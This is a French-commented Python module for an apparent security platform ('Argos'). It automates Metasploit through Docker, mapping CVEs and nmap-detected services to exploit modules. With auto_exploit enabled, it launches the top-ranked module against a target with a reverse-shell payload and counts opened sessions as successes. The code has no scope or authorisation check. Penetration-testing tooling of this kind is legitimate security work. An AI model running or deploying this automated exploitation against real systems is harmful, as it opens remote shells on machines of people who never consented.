"""
entry.py — Module Metasploit
Argos Security Platform

Stratégie en deux phases :
  Phase 1 — Par CVE   : search cve:<ID> → exploit direct si trouvé
  Phase 2 — Par service : search par nom/port/techno depuis nmap → modules génériques

La phase 2 comble le cas fréquent où les CVEs applicatives (Node.js, Express, etc.)
n'ont pas de module MSF mais où des modules par service existent (http_version,
dir_scanner, exploit/multi/http/...).
"""

import re
import docker
from dataclasses import dataclass

DOCKER_IMAGE = "metasploitframework/metasploit-framework"
EXPLOIT_SEVERITIES = {"CRITICAL", "HIGH"}

# Mapping service nmap → termes de recherche MSF
# Clé : nom de service ou produit (lowercase, partiel)
# Valeur : liste de queries MSF à essayer dans l'ordre
SERVICE_MSF_MAP = {
    "node.js":    ["nodejs", "http nodejs", "exploit/multi/http"],
    "nodejs":     ["nodejs", "http nodejs"],
    "express":    ["express nodejs", "http nodejs"],
    "http":       ["http", "exploit/multi/http"],
    "https":      ["http ssl", "exploit/multi/http"],
    "apache":     ["apache", "exploit/multi/http/apache"],
    "nginx":      ["nginx", "http"],
    "iis":        ["iis", "exploit/windows/iis"],
    "tomcat":     ["tomcat", "exploit/multi/http/tomcat"],
    "jenkins":    ["jenkins", "exploit/multi/http/jenkins"],
    "wordpress":  ["wordpress", "exploit/unix/webapp/wp"],
    "drupal":     ["drupal", "exploit/unix/webapp/drupal"],
    "joomla":     ["joomla"],
    "mysql":      ["mysql", "exploit/multi/mysql", "auxiliary/scanner/mysql"],
    "mariadb":    ["mysql mariadb"],
    "postgresql": ["postgres", "exploit/multi/postgres"],
    "redis":      ["redis", "exploit/linux/redis"],
    "mongodb":    ["mongodb"],
    "smb":        ["smb", "exploit/windows/smb"],
    "microsoft-ds":["smb", "exploit/windows/smb"],
    "netbios":    ["netbios smb"],
    "msrpc":      ["dcerpc rpc", "exploit/windows/dcerpc"],
    "vmware":     ["vmware", "exploit/multi/vmware"],
    "vmware-auth":["vmware"],
    "ssh":        ["ssh", "auxiliary/scanner/ssh", "exploit/multi/ssh"],
    "ftp":        ["ftp", "auxiliary/scanner/ftp", "exploit/unix/ftp"],
    "smtp":       ["smtp", "auxiliary/scanner/smtp"],
    "telnet":     ["telnet", "exploit/linux/telnet"],
    "mssql":      ["mssql", "exploit/windows/mssql"],
    "oracle":     ["oracle", "exploit/multi/oracle"],
}


@dataclass
class ExploitResult:
    cve_id:     str           # CVE ou "SERVICE:<name>:<port>"
    msf_module: str
    severity:   str
    score:      float
    product:    str
    target:     str
    port:       int
    status:     str           # found | success | failed | no_module | skipped
    output:     str = ""
    source:     str = "cve"  # "cve" | "service"


# ── Normalisation ─────────────────────────────────────────────────────────────

def _svc_to_dict(obj) -> dict:
    if isinstance(obj, dict): return obj
    if hasattr(obj, "__dict__"): return obj.__dict__
    return {}

def _normalize_list(raw) -> list[dict]:
    if not raw: return []
    if isinstance(raw, list): return [_svc_to_dict(v) for v in raw]
    return [_svc_to_dict(raw)]

def _extract_ip(target) -> str:
    if target is None: return ""
    if isinstance(target, list):
        for item in target:
            ip = _extract_ip(item)
            if ip: return ip
        return ""
    if isinstance(target, dict):
        if "host" in target: return str(target["host"]).strip()
    if hasattr(target, "host"): return str(getattr(target, "host")).strip()
    s = str(target).strip()
    if re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', s): return s
    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]+$', s): return s
    return ""


# ── MSF helpers ───────────────────────────────────────────────────────────────

def _run_msf(client, rc_script: str) -> str:
    try:
        out = client.containers.run(
            image        = DOCKER_IMAGE,
            command      = ["msfconsole", "-q", "-x", rc_script],
            remove       = True,
            network_mode = "host",
            stdout=True, stderr=True,
        )
        return out.decode("utf-8", errors="replace")
    except Exception as e:
        return f"ERROR: {e}"

def _parse_modules(raw: str) -> list[str]:
    """Extrait les chemins de modules depuis la sortie de msfconsole search."""
    modules = []
    for line in raw.splitlines():
        parts = line.strip().split()
        if parts and parts[0].isdigit() and len(parts) >= 2:
            mod = parts[1]
            if any(mod.startswith(p) for p in ("exploit/", "auxiliary/", "post/")):
                modules.append(mod)
    return modules

def search_by_cve(client, cve_id: str) -> list[str]:
    raw = _run_msf(client, f"search cve:{cve_id}; exit")
    return _parse_modules(raw)

def search_by_keyword(client, keyword: str) -> list[str]:
    raw = _run_msf(client, f"search type:exploit {keyword}; exit")
    mods = _parse_modules(raw)
    if not mods:
        # Deuxième essai sans filtre type
        raw = _run_msf(client, f"search {keyword}; exit")
        mods = _parse_modules(raw)
    return mods

def run_exploit(client, msf_module: str, target: str, port: int, product: str) -> tuple[str, str]:
    port_str  = f"\nset RPORT {port}" if port else ""
    payload   = "windows/x64/meterpreter/reverse_tcp" if "windows" in product.lower() else "generic/shell_reverse_tcp"
    rc = f"""use {msf_module}
set RHOSTS {target}{port_str}
set LHOST 0.0.0.0
set PAYLOAD {payload}
set ConnectTimeout 10
set Timeout 20
run -z -j
sleep 5
sessions -l
exit"""
    print(f"[metasploit]   → {msf_module} vs {target}:{port}")
    out = _run_msf(client, rc)
    if any(m.lower() in out.lower() for m in ["Meterpreter session", "Command shell session", "session opened"]):
        return "success", out
    return "failed", out


# ── Phase 1 : recherche par CVE ───────────────────────────────────────────────

def phase_cve(client, vulns: list[dict], target: str,
              auto_exploit: bool, max_exploits: int) -> tuple[list[ExploitResult], int]:
    results = []
    attempts = 0

    for v in sorted(vulns, key=lambda x: x.get("score", 0), reverse=True):
        cve_id  = v.get("cve_id", "")
        sev     = v.get("severity", "UNKNOWN")
        score   = float(v.get("score", 0))
        product = v.get("product", "")
        port    = int(v.get("port", 0) or 0)

        if not cve_id or cve_id == "N/A" or score < 4.0:
            continue

        print(f"\n[metasploit] [CVE] {cve_id} [{sev} {score}] {product}")
        modules = search_by_cve(client, cve_id)

        if not modules:
            print(f"[metasploit]   → aucun module MSF pour ce CVE")
            results.append(ExploitResult(
                cve_id=cve_id, msf_module="—", severity=sev, score=score,
                product=product, target=target, port=port,
                status="no_module", source="cve",
            ))
            continue

        best = modules[0]
        print(f"[metasploit]   → {len(modules)} module(s) : {best}")

        should_run = auto_exploit and attempts < max_exploits and sev in EXPLOIT_SEVERITIES
        if should_run:
            attempts += 1
            status, out = run_exploit(client, best, target, port, product)
        else:
            status, out = "found", ""

        results.append(ExploitResult(
            cve_id=cve_id, msf_module=best, severity=sev, score=score,
            product=product, target=target, port=port,
            status=status, output=out[:500], source="cve",
        ))

    return results, attempts


# ── Phase 2 : recherche par service nmap ──────────────────────────────────────

def phase_service(client, nmap_services: list[dict], target: str,
                  auto_exploit: bool, max_exploits: int,
                  exploit_attempts: int) -> list[ExploitResult]:
    """
    Pour chaque service nmap ouvert, cherche des modules MSF adaptés
    indépendamment des CVEs.
    """
    results = []
    seen_modules: set[str] = set()

    for svc in nmap_services:
        svc_name = (svc.get("name") or "").lower()
        product  = (svc.get("product") or "").lower()
        port     = int(svc.get("port", 0) or 0)
        state    = svc.get("state", "")

        if state != "open":
            continue

        # Cherche les keywords MSF correspondants
        keywords: list[str] = []
        for key, kw_list in SERVICE_MSF_MAP.items():
            if key in svc_name or key in product:
                keywords.extend(kw_list)

        if not keywords:
            continue

        print(f"\n[metasploit] [SERVICE] {svc_name}:{port} ({svc.get('product','')})")

        # Dédoublonne les keywords
        tried = set()
        svc_modules: list[str] = []
        for kw in keywords:
            if kw in tried: continue
            tried.add(kw)
            found = search_by_keyword(client, kw)
            # Filtre : modules pas déjà vus et pertinents pour le port
            for m in found:
                if m not in seen_modules:
                    svc_modules.append(m)
                    seen_modules.add(m)
            if svc_modules:
                break  # on a trouvé des modules, on s'arrête

        if not svc_modules:
            print(f"[metasploit]   → aucun module pour ce service")
            continue

        best = svc_modules[0]
        print(f"[metasploit]   → {len(svc_modules)} module(s) : {best}")

        should_run = auto_exploit and exploit_attempts < max_exploits
        if should_run:
            exploit_attempts += 1
            status, out = run_exploit(client, best, target, port, product)
            print(f"[metasploit]   → {status}")
        else:
            status, out = "found", ""

        results.append(ExploitResult(
            cve_id   = f"SERVICE:{svc_name}:{port}",
            msf_module = best,
            severity = "INFO",
            score    = 0.0,
            product  = svc.get("product", svc_name),
            target   = target,
            port     = port,
            status   = status,
            output   = out[:500],
            source   = "service",
        ))

    return results


# ── Print ─────────────────────────────────────────────────────────────────────

def print_results(results: list[ExploitResult]) -> None:
    print(f"\n{'SOURCE':<10} {'CVE/SERVICE':<30} {'MODULE MSF':<45} {'STATUT':<10} SCORE")
    print("-" * 110)
    for r in results:
        label = r.cve_id if r.source == "cve" else r.cve_id
        print(f"{r.source:<10} {label:<30} {r.msf_module:<45} {r.status:<10} {r.score}")
    print()
    successes = [r for r in results if r.status == "success"]
    found     = [r for r in results if r.status == "found"]
    if successes:
        print(f"[metasploit] ✓ {len(successes)} exploitation(s) réussie(s) !")
    print(f"[metasploit] {len(found)} module(s) disponible(s), {len(successes)} succès.")


# ── Point d'entrée Argos ──────────────────────────────────────────────────────

def main(args: dict) -> list[ExploitResult]:
    """
    args:
      target          : str|list  — IP directe ou $nmap.output
      vulnerabilities : list      — sortie vuln_lookup
      nmap_services   : list      — sortie nmap (optionnel, pour phase 2)
      auto_exploit    : bool      — tenter l'exploitation
      max_exploits    : int       — limite de tentatives
    """
    target       = args.get("target", "")
    raw_vulns    = args.get("vulnerabilities") or []
    raw_services = args.get("nmap_services")   or []
    auto_exploit = args.get("auto_exploit", False)
    max_exploits = int(args.get("max_exploits", 3) or 3)

    if isinstance(auto_exploit, str):
        auto_exploit = auto_exploit.lower() in ("true", "1", "yes")

    target = _extract_ip(target)
    if not target:
        print("[metasploit] ERROR: target invalide.")
        return []

    vulns    = _normalize_list(raw_vulns)
    services = _normalize_list(raw_services)

    print(f"[metasploit] Cible       : {target}")
    print(f"[metasploit] CVEs        : {len(vulns)}")
    print(f"[metasploit] Services    : {len(services)}")
    print(f"[metasploit] Mode        : {'exploitation auto' if auto_exploit else 'recherche seule'}")
    print(f"[metasploit] Max exploits: {max_exploits}")

    client = docker.from_env()

    # Phase 1 — par CVE
    print("\n[metasploit] ══ PHASE 1 : recherche par CVE ══")
    results_cve, attempts = phase_cve(client, vulns, target, auto_exploit, max_exploits)

    # Phase 2 — par service (si nmap_services fourni)
    results_svc = []
    if services:
        print("\n[metasploit] ══ PHASE 2 : recherche par service ══")
        results_svc = phase_service(client, services, target, auto_exploit, max_exploits, attempts)
    else:
        print("\n[metasploit] Phase 2 ignorée (nmap_services non fourni)")
        print("[metasploit] CONSEIL: ajoute \"nmap_services\": \"$nmap.output\" dans les args")

    all_results = results_cve + results_svc
    print_results(all_results)
    return all_results